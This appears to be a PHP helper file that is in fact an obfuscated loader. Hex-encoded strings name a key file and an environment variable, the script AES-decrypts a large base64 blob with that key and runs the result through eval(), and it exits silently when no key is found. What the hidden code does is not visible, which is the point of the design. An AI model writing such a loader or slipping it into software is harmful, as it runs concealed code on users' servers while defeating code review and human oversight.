<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('9W8KJp9YrsiHRSkINVn3cg==');

$c=base64_decode(

'SJHcoWtLOpV4RvrGYZNEhBCPr2K8eQS+61jyM5N0JPahTsSshjbW165JtSX0IfjGFsmAX9yfXivG' .
'TgDFPC+zS+nxa1jOJdbTqSJqWQcA0awYJ6S/V1P+Wt1RI+53Pa4rl1DUioedQew1LyoqCQ7rILg3' .
'LmWFTB+rfCWWphI+bhJ6Pq+ifsVMrL7zlh80AtJr0noJja63RQc5BT3Hl7QOxSKGLV7lOXbHBmnX' .
'XKvo3K+4IjUrzU+uR+fmH5GcM6vIqIBNNCs3B/8SsepsSvxNIiLPtKqaWojk2xLTQLw1NX1llWTl' .
'iHW3vFmUqfP/vT01Cg6bjebGaKW2n3DumbPHfDlCF18PaEyFEqH1XJX04Tl8jOKQWoIgtAUkRUBr' .
'/73c2Asv2Tnm2DxCcL2NN+xjSBBb4HH9i4IivOwYnrMfHKBtD88rGqoQoMJBbpC3hgXH9gdk/QoF' .
'WQXRSeO0JXkuL/1MKPOcTH1wVcMLRUEXlhHu1ege9ij/kwmciiHcGmzwq/QckJUj4rQJPOKMxNOV' .
'Obl54HBHttnUso1h95hxMF9La5wMSelj4+MxHFyGlrTT0UPKg86Q5CGUsczJO0gTgKl/UgyJs/Cq' .
'LLRGpzsaoaIQqbhXOCp2ztzUvevYz6dKm/mWrmg5wAd5OpFRpPl011GiuoXTelou5wOwjkpNiiZx' .
'L1qicsqxm32QzHVaoM041rEzFIiXsXQM4JKIV7lKbeb3DcAW99KYp3k1UIW3+dDQ1CPsaSqK1I6D' .
'0vc6Xd4O/ooIpz8Vy9fbYNoSjk/ANBS1zfZUAPCm/Iw8GRsB+hVdAEgmNp7E8/phRYwYH4hJOEYu' .
'dXhviZKsJZKy4ixoj/CNnqv6uLmRE+iMbQE9U4kSOzMfyOgbvRq2H9dad9MlE4Qvh1FvSl/+LT3W' .
'7t8SrGjh1iq8NwnPuJP/qabbDdE4UYIwWIF8BO0kcGk+eHj8DHZxBgxF2oUv4J8hkewk+e5eJtbH' .
'wEfhVOTcELAlZRO0vfISSNoq7LQM6ZpQ2dWh8e2NwpYpP2VJ9OQ5nyvf7NCO3P8fwl/AQkut+via' .
'HfWYSQLwYIWk0WjWxjRhswO3LYThLqoSieNHS5exUMxoMb2LWHTwPfcqElfBKpA8yeM3BPcV9Vly' .
'SB2oqNOi2382DW7RJu8zzhp8UYSSXqu5I2SxqTyaIgdDmW9HdjbsVG83kp5qQ6+cWl7nTlzj7ZuL' .
'88zY5TriRjc8zlFSXCNJek7NDW3KjhD2jOGhsXgcZK5iKjmJeyoDi9A88p2eS58HCXsGItJuzCNq' .
'YdIAZ4uuzGxXoK7dHNKIMV0TFZTA8HNPkY5u+ckoLVt3YXco0QPh/JipgXhhjbxbJ8twQictyb5o' .
'dtyRGQw+UJX2pG+9JeGt8t1bLcb++7T1AqIEmWYgXS98myH8FiXIiFZ759+7zZYEHMSYse6QB7NP' .
'mg1rRO4WaTnLTiiVjNpsqrxIvNumuKGN3QyC/2KE3b7PmRFvZm7ou95WlgNnto/vECp3N/Ew6F4v' .
'ENq/RXm2LunoKuvvaUrC4bxg622W8emAv0lr0K791CxU5DhHDFfK6ygs7AKZmcewF780RD/VQKpq' .
'LR8o7gfd5bl94Peq9KENzq44pwAEjSF0NXu2APu4dsS5jL029FTOS7KNPdxDmnYlNecUMpFASMGt' .
'XA8MjC/V5DtsXuSHJIT2NHnPVeoTQImoCs/Gdk8sYNzSshFthZMMfVnY0snpx1xzd8CCd7YQtuHq' .
'fWMmpTYzSHN425azlDt1tlKdMRxRaJhB1sDanqgBWEz+xKBGpfEJHy+6JvjOyVs1ZAmVj3ucRAYw' .
'iAJxToVbRLoGnXb965tTa/yAjp1NPmTh6SuwLxGw9GyV/3L3x/nYIsOkFMUlm7mPxvjbhqR7nAg1' .
'GIttbvM1//WJqSSggRW/2nB6oqdQ2GCSxdas+RpxSbyF/VzUqg5oIBo+kuIQu9Bq+60y3Xgvq9oI' .
'VE+QiIQe436PWDjo4Z9nFkfGhnP5qK7kTc3PXRwGME7IJBXqnhgMI4p9N424dSwJa7bPk0ZpvjRe' .
'tqrXcmAwqgQeVtTdSh/AASSGudpUH9VLI1dzLGFKhY9tFAGfITMGZ78v6PUsSa0YIhIELKk0+8NI' .
'13NhLd0vSi9kFxH/S2r12S8KnIVp8nLa7aMQMWFOxdtX27md'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

